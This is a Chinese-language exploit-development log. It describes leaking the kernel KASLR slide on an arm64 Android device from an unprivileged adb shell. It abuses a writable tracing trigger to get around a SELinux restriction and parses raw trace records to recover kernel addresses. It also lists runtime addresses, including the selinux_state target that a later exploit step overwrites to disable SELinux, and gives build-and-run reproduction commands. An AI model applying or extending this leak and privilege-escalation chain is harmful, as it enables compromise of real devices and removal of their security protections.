# KASLR slide 提取成功（2026-10-25）

**结论：`slide = 0x2459c00000`（本次开机）。** 这是整条利用链此前唯一缺的整数。

## 方法（全只读）

1. 用 `events/kmem/rss_stat/trigger`（mode 0666）作旁路，`echo 'enable_event:sched:sched_blocked_reason'`
   打开原本被 SELinux 拒绝 `enable` 的事件。
2. 从 `/sys/kernel/tracing/per_cpu/cpuN/trace_pipe_raw` 读**原始**记录（文本形式里 `%pS` 只给符号名，
   原始记录保留真地址）。
3. 按真实布局解析：
   - 每 **4096 字节一页**，页首 **16 字节**是页头（`u64 timestamp; u64 commit;`），记录从 `+16` 开始；
   - `ring_buffer_event` 长度 = `type_len * 4 + 4`（`type_len` 在首 u32 的低 5 位）；
   - `type_len==0` 是 padding（长度在第 2 个 u32），`1/2` 是 time_extend / time_stamp（各 12 字节）。
4. `sched_blocked_reason` 的布局（`format` 可读）：`pid` 在 payload+8，**`caller` 在 payload+16**。
5. 拿 `caller` 减去离线 `kernel.elf` 的静态符号地址，得到 slide；要求 **2 MB 对齐**。

## 验证

```
slide = 0xffffffe4d9dd2f04 - 0xffffffc0801d2f04 = 0x2459c00000
0x2459c00000 % 0x200000 == 0                       ✓ 对齐
```

交叉验证（文本 trace 给出的符号 vs 原始地址反推的符号）：

| 原始 caller | 减 slide 后 | 文本 trace 对应行 |
| --- | --- | --- |
| `0xffffffe4d9dd2f04` | `worker_thread+0x248` | `caller=worker_thread+0x248/0x410` ✓ |
| `0xffffffe4d9e6b600` | `__migrate_disable+0x10` | — |
| `0xffffffe4d9e30900` | `cfi_brk_handler+0xdc` | — |
| `0xffffffe4d9dc6a00` | `rcu_gp_fqs_loop+0x11c` | — |

## 本次开机的运行时地址（静态 + slide）

| 符号 | 静态 | 运行时 |
| --- | --- | --- |
| `_text` | `0xffffffc080000000` | `0xffffffe4d9c00000` |
| `begin_new_exec` | `0xffffffc0802cf910` | `0xffffffe4d9ecf910` |
| `do_timer_create` | `0xffffffc0803a6f1c` | `0xffffffe4d9fa6f1c` |
| `__arm64_sys_getpid` | `0xffffffc08023d960` | `0xffffffe4d9e3d960` |
| `posix_timer_fn` | `0xffffffc0802401f4` | `0xffffffe4d9e401f4` |
| `timerfd_tmrproc` | `0xffffffc080140f7c` | `0xffffffe4d9d40f7c` |
| **`selinux_state`** | `0xffffffc082959630` | **`0xffffffe4dc559630`** |

`selinux_state - 7` 即 BRM 链第 ⑥ 步要写零的地址：`0xffffffe4dc559629`。

## 注意

- slide **每次开机都会变**（BRM 文档也强调这一点）。重启后必须重跑一次提取。
- 这条路径全程只读：没有写 trace 缓冲区以外的任何内核状态，没有装探针，没有写块设备。

## 复现

```bash
# 设备侧（静态 aarch64，无需 root，uid 2000 即可）
gcc -O2 -static -pthread -o slideprobe3 slideprobe3.c
adb push slideprobe3 /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/slideprobe3
adb shell /data/local/tmp/slideprobe3

# 主机侧：用 nab 输出的符号表把 caller 反推成 slide
llvm-nm -n -S kernel.elf > nm.txt
python scripts/resolve_symbols.py nm.txt <slide> <caller...>
```
